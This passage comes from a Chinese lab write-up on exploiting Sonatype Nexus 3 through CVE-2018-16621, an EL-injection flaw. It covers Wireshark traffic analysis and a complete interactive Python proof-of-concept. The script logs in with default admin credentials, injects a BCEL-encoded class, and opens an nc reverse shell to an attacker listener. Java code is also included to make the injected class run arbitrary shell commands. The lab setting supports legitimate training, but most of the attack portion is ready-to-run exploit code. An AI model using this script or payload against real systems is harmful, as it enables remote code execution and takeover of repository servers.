c9H$c9H$GO$g$f8$J$8dl$c3x$d0$aa$7b$91$fe$P$D$95$e5$df$5d$90$g$iv$E$A$A').newInstance().exec('rm -f /tmp/f;mkfifo /tmp/f;/bin/sh -i < /tmp/f 2>&1 | nc 192.168.109.10 6666 > /tmp/f')} "]}],"type":"rpc","tid":24}
```

<img src="picture/nexus漏洞利用流量抓包.png" alt="nexus漏洞利用流量抓包" style="zoom: 20%;" />

2.使用wireshark分析流量包，筛选http流量：

<img src="picture/nexus筛选http流，查看可疑数据包.png" alt="nexus筛选http流，查看可疑数据包" style="zoom:20%;" />

3.按数据包长度排序，发现可疑流量，对其进行http流追踪：

<img src="picture/nexus对可疑流量包进行http追踪流量.png" alt="nexus对可疑流量包进行http追踪流量" style="zoom:20%;" />

4.发现其中包含恶意负载，执行反弹shell命令。

<img src="picture/nexushttp追踪流发现反弹shell的命令执行.png" alt="nexushttp追踪流发现反弹shell的命令执行" style="zoom: 20%;" />

#### 编写POC脚本，一键执行漏洞利用反弹shell

POC脚本 `nexus_poc.py`:

```python
import requests
import json
import subprocess
import threading

# === 用户交互式输入 ===
target_ip = input("请输入目标 Nexus3 IP（例如 192.168.109.4）: ").strip()
target_port = input("请输入目标 Nexus3 端口（例如 60357）: ").strip()
callback_ip = input("请输入本机监听 IP（例如 192.168.109.10）: ").strip()
callback_port = input("请输入本机监听端口（例如 4444）: ").strip()

HOST = f"http://{target_ip}:{target_port}"
CALLBACK_IP = callback_ip
CALLBACK_PORT = callback_port

USERNAME_B64 = "YWRtaW4%3D"  # 用户名admin经过base64+url编码
PASSWORD_B64 = "YWRtaW4xMjM%3D"  # 密码admin123经过base64+url编码

# === 完整 BCEL 字符串（务必为一整行） ===
BCEL_STRING = """$$BCEL$$$l$8b$I$A$A$A$A$A$A$ff$8dSMS$d3P$U$3d$8f$b6I$J$v$U$K$94$60QA$c5P$uU$E$3fZD$Fq$86$Z$40$87$3a$3a$ZWi$fa$c0$60I$3ai$ca$b0r$e5$7fq$ab$9b$d6$91$d1$a5$L$7f$87$L$fd$P$8ex_Z$3e$8a$ca$d8I$df$cb$bb$f7$9c$7b$eeG$de$d7_$l$3f$D$98$c5$p$F$j$I$c9$I$ab$88$40b$88o$9b$bbf$b6l$3a$5b$d9$c7$c5mn$f9$M$d2$bc$ed$d8$fe$CCH$9fx$a6$m$8aN$Z$8a$8a$$$a8$M$bd$c7$f0$8d$9a$e3$db$3b$9cA$d9$e2$fe$d1a$40$9fX$fd$D$93$97$d1$dd$sU$f0$3d$db$d9$8a$o$ce$mg$8b$b6$93$ad$be$8c$a2$8f$a1$pc$J$c1$7e$V$D$Yd$I$f3$3dn1$e8$fa$8b$d5$d3$dc$fcI$99$t$9ek$f1j$95d$86$Y$G$D$bb$edf$Xk$9b$9b$dc$e3$a5$Nn$96$b8$tc$98A$3b$f4$ad8$95$9aO$91$b8$b9$d3t$xHaD$c6y$V$Xp$b1$ad$ceVp$86n$aa$f3$E$8f$nyXk$7b$c0$bc$C$Nc$a2$bf$97$Y$86$f4$bfBDc$93$b8$o$40$e3$M$89cP3$9b$c0$9f$82$aebBd$p$94$97$3d$cf$f5$9al$Z$93$q$7e$ba$p$8b5$bb$i$U$92FH$E$9fV$91$c55$86$uQJ$ab$b6C$c3$e9o$hN$ab$91$820$a3$e2$Gfi$f4f$a5$c2$9d$SCF$3f$bb$e3m$92A$88$9b$o$c4$z$86$94$bet6$f0$8e$8a$5c$90$97$ef6$9d2$e6$Z$o$7c$d7$y$cf$d0$c8$97$dc$Se$da$p$S$5e$af$ed$U$b9$f7$d4$y$96$c92$fe_$Z$e5$Zb$F$df$b4$5e$ad$99$95$WQY$de$b3x$c5$b7$5d$a7$wc$89$9a$7d$cc9$f2$Q$aa$e0$d6$3c$8b$3f$b2$DJ$90$cc$b4$Ab$Uy$ba1$e2$d7$B$s$ee$M$adw$e94B$3b$a3$3d$92n$80$bd$a7$X$86$FZ$a5$c0$Y$a6u$A$f7$88$o$a0$df$88$s$d3$fe$e6$Dd$e9$TbF$a8$af$a7$60$84$fbz$LFd$b2PGbm$lIc$l$9a1U$c7$b9$GF$h$b8$bc$7e$c2t$b5i$ca$85$f7$916$g$98$caE2ud$8c$9c$f4$F$J$z$a2Iu$5c$8f$xu$cc$3d$7f$7b$f0C$L$ff$cb$f5$5d$8b$d4q$fb$5dP$88$c8t$i$9d$b4F$e9$5b$ed$c2$YTL$n$869t$e3$3e$e2XA$C$W$fa$f1$g$83t$G$f9C$Hd$94d$d0$j$8b$c9H$c9H$GO$g$f8$J$8dl$c3x$d0$aa$7b$91$fe$P$D$95$e5$df$5d$90$g$iv$E$A$A"""

# === 监听线程 ===
def listen_shell():
    print(f"\n[+] 启动监听：nc -lvnp {CALLBACK_PORT}")
    print("[*] 如果目标成功反弹，你将在此终端获得 shell。\n")
    subprocess.call(["nc", "-lvnp", str(CALLBACK_PORT)])

# === 启动监听线程 ===
listener_thread = threading.Thread(target=listen_shell)
listener_thread.start()

# === 登录获取 NXSESSIONID ===
login_url = f"{HOST}/service/rapture/session"
login_headers = {
    "X-Nexus-UI": "true",
    "Referer": f"{HOST}/",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "zh-CN,zh;q=0.9",
    "User-Agent": "Mozilla/5.0",
    "Accept": "*/*",
    "Origin": HOST,
    "X-Requested-With": "XMLHttpRequest",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
}

login_data = f"username={USERNAME_B64}&password={PASSWORD_B64}"

print("\n[+] 正在登录 Nexus3...")
session = requests.Session()
resp = session.post(login_url, headers=login_headers, data=login_data)

if "Set-Cookie" not in resp.headers and resp.status_code != 204:
    print("[-] 登录失败！响应内容：")
    print(resp.text)
    exit()

cookie = session.cookies.get_dict().get("NXSESSIONID", "")
print(f"[+] 登录成功，NXSESSIONID = {cookie}\n")

# === 构造 Spring-EL 注入 payload ===
el_expr = (
    f"${{''.class.forName('com.sun.org.apache.bcel.internal.util.ClassLoader')"
    f".newInstance().loadClass('{BCEL_STRING}')"
    f".newInstance().exec('rm -f /tmp/f;mkfifo /tmp/f;/bin/sh -i < /tmp/f 2>&1 | nc {CALLBACK_IP} {CALLBACK_PORT} > /tmp/f')}}"
)

inject_data = {
    "action": "coreui_User",
    "method": "update",
    "data": [{
        "userId": "admin",
        "version": "10",
        "firstName": "Administrator",
        "lastName": "User1",
        "email": "admin@example.org",
        "status": "active",
        "roles": [el_expr]
    }],
    "type": "rpc",
    "tid": 24
}

inject_headers = {
    "Cookie": f"NXSESSIONID={cookie}",
    "Content-Type": "application/json",
    "Origin": HOST,
    "Referer": f"{HOST}/",
    "X-Nexus-UI": "true",
    "User-Agent": "Mozilla/5.0",
    "X-Requested-With": "XMLHttpRequest"
}

print("[+] 正在发送 exploit payload...")
exploit_url = f"{HOST}/service/extdirect"
exploit_resp = session.post(exploit_url, headers=inject_headers, data=json.dumps(inject_data))

print(f"[+] 返回状态码: {exploit_resp.status_code}")
print("[+] 服务器响应:")
print(exploit_resp.text)

# === 等待监听线程结束（即交互 shell） ===
listener_thread.join()
```

在`kali-attacker`中运行脚本，输入靶机ip、端口、本机监听ip、端口：

<img src="picture/nexus运行自动化脚本.png" alt="nexus运行自动化脚本" style="zoom:20%;" />

成功get反弹shell。

## 遇到的问题及解决方案

1.在进行加载编码后的恶意class部分时，使用编码后的class，执行命令时发现当执行一整条命令时不能执行连接符、管道符等 Shell 语法，如执行`echo 1 && echo 2` 结果为 `1 && echo2`。

原因：

原始`eval.java`:

```java
import java.io.BufferedReader;
import java.io.InputStreamReader;

public class eval {
    public String exec(String cmd) throws Exception {
        BufferedReader br = new BufferedReader(
                new InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));
        StringBuilder sb = new StringBuilder();
        for (String line; (line = br.readLine()) != null; )
            sb.append(line).append('\n');
        return sb.toString();
    }
}
```

其中`Runtime.getRuntime().exec(cmd)`核心的命令执行方式，Java 在后台会自动将这个字符串**按空格拆分**，类似执行：

```bash
exec("echo", "1", "&&", "echo", "2")
```

这不是通过 Shell，而是直接执行了程序 `echo`，后面的 `"1"`, `"&&"`, `"echo"`, `"2"` 都当作参数：

```bash
执行的是：echo 1 && echo 2
         ↑     ↑   ↑     ↑
       程序   参数 参数  参数

```

此时的 `|`、`;`、`>` 等只是**普通文本参数**，根本不会有管道功能。

解决方案：将原始`eval` 类中心的命令执行方式从：

```java
Runtime.getRuntime().exec(cmd)
```

改为：

```java
Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd})
```

修改后的`eval.java`:

```java
import java.io.BufferedReader;
import java.io.InputStreamReader;

public class eval2 {

    public String exec(String cmd) throws Exception {

        Process p = Runtime.getRuntime().exec(             // ***
                new String[]{"/bin/sh", "-c", cmd});       // ***

        BufferedReader br = new BufferedReader(
                new InputStreamReader(p.getInputStream()));
        BufferedReader err = new BufferedReader(
                new InputStreamReader(p.getErrorStream()));

        StringBuilder sb = new StringBuilder();
        String line;

        while ((line = br.readLine()) != null)  sb.append(line).append('\n');
        while ((line = err.readLine()) != null) sb.append(line).append('\n');

        return sb.toString();
    }
}
```

之后使用javac将其编译，之后再BCEL编码使用即可。

验证问题解决：

<img src="picture/nexus测试连接符可用.png" alt="nexus测试连接符可用" style="zoom:20%;" />

## 参考资料

[Java中动态加载字节码的方法 (持续补充)_utility.encode true false-CSDN博客](https://blog.csdn.net/mole_exp/article/details/122768814)

[f1tz/BCELCodeman: BCEL encode/decode manager for fastjson payloads](https://github.com/f1tz/BCELCodeman)

[msf如何连接数据库 | PingCode智库](https://docs.pingcode.com/baike/2170202)

[后渗透之MSF添加路由与主机探测_msf上线后路由开启无法扫描存活-CSDN博客](https://blog.csdn.net/qq_44159028/article/details/115802527)

[CVE Record: CVE-2018-16621](https://www.cve.org/CVERecord?id=CVE-2018-16621)